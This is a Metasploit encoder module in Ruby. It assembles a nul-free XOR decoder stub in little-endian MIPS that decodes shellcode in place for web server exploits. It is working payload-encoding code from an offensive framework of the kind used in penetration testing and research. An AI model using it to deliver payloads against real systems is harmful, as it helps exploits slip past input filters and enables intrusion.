##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Encoder::Xor

  def initialize
    super(
      'Name'             => 'XOR Encoder',
      'Description'      => %q{
        Mips Web server exploit friendly xor encoder
      },
      'Author'           =>
        [   'Julien Tinnes <julien[at]cr0.org>',   # original shellcode
            'Pedro Ribeiro <pedrib@gmail.com>',    # fix Linux >= 2.6.11 and toupper() compat
        ],
      'Arch'             => ARCH_MIPSLE,
      'License'          => MSF_LICENSE,
      'Decoder'          =>
        {
          'KeySize'   => 4,
          'BlockSize' => 4,
          'KeyPack'   => 'V',
        })
  end

  #
  # Returns the decoder stub that is adjusted for the size of the buffer
  # being encoded.
  #
  def decoder_stub(state)

    # add one xor operation for the key (see comment below)
    number_of_passes=state.buf.length/4+1
    raise EncodingError.new("The payload being encoded is too long (#{state.buf.length} bytes)") if number_of_passes > 10240
    raise EncodingError.new("The payload is not padded to 4-bytes (#{state.buf.length} bytes)") if state.buf.length%4 != 0

    # 16-bits not (again, see below)
    reg_10 = (number_of_passes+1)^0xFFFF
    reg_5 = state.buf.length^0xFFFF
    decoder = Metasm::Shellcode.assemble(Metasm::MIPS.new(:little), <<EOS).encoded.data
;
; MIPS nul-free xor decoder
;
; (C) 2006 Julien TINNES
; <julien at cr0.org>
;
; The first four bytes in encoded shellcode must be the xor key
; This means that you have to put the xor key right after
; this xor decoder
; This key will be considered part of the encoded shellcode
; by this decoder and will be xored, thus becoming 4NULs, meaning nop
;
; This is Linux-only because I use the cacheflush system call
;
; You can use shellforge to assemble this, but be sure to discard all
; the nul bytes at the end (everything after x01\\x4a\\x54\\x0c)
;
; change 2 bytes in the first instruction's opcode with the number of passes
; the number of passes is the number of xor operations to apply, which should be
; 1 (for the key) + the number of 4-bytes words you have in your shellcode
; you must encode ~(number_of_passes + 1) (to ensure that you're nul-free)


;.text
;.align	2
;.globl	main
;.ent	main
;.type		 main,@function

main:

li macro reg, imm
;	lui reg, ((imm) >> 16) & 0ffffh
;	ori reg, reg, (imm) & 0ffffh
  addiu reg, $0, imm		    ; sufficient if imm.abs <= 0x7fff
endm

  li(	$10, #{reg_10})		    ; load number of passes ^ 0xffff
  nor	$10, $10, $0		      ; put number of passes in $10

  li(	$11,-89)		          ; addend to calculated PC is 73
;.set noreorder
next:
  bltzal  $8, next
;.set reorder
  slti    $8, $0, 0x8282
  nor     $11, $11, $0	    ; addend in $9
  addu	$25, $31, $11		    ; $25 points to encoded shellcode +4
  addu	$16, $31, $11		    ; $16 too (used to set up the cacheflush() arg down below)

;	lui	$2, 0xDDDD     		    ; first part of the xor (old method)
  slti	$23, $0, 0x8282     ; store 0 in $23 (our counter)
;	ori	$17, $2, 0xDDDD 	    ; second part of the xor (old method)
  lw	$17, -4($25)		      ; load xor key in $17


  li(	$9, -5)
  nor	$9, $9, $0		        ; 4 in $9

  addi	$15, $9, -3		      ; 1 in $15
loop:
  lw	$8, -4($25)

  addu	$23, $23, $15		    ; increment counter
  xor	$3, $8, $17
  sltu	$30, $23, $10		    ; enough loops?
  sw	$3, -4($25)
  addi	$6, $9, -1		      ; 3 in $6 (for cacheflush)
  bne	$0, $30, loop
  addu	$25, $25, $9		    ; next instruction to decode :)


  addiu	$4, $16, -4         ; cacheflush() addr parameter
  li(      $10,#{reg_5})    ; cacheflush() nbytes parameter
  nor   $5, $10, $0         ; same as above
;   li      $6,3            ; $6 is set above, 3rd arg for cacheflush()

;	.set    noreorder
  li(     $2, 4147)         ; cacheflush
;   .ascii "\\x01JT\\x0c"   ; nul-free syscall
  syscall 0x52950
;	.set    reorder


; write last decoder opcode and decoded shellcode
;	li      $4,1              ; stdout
;	addi	$5, $16, -8
;	li      $6,40             ; how much to write
;	.set    noreorder
;	li      $2, 4004          ; write
;	syscall
;	.set    reorder


  nop				                ; encoded shellcoded must be here (xor key right here ;)
; $t9 (aka $25) points here

EOS
    # put the key at the end of the decoder
    state.decoder_key_offset = decoder.length - 4

    return decoder
  end
end
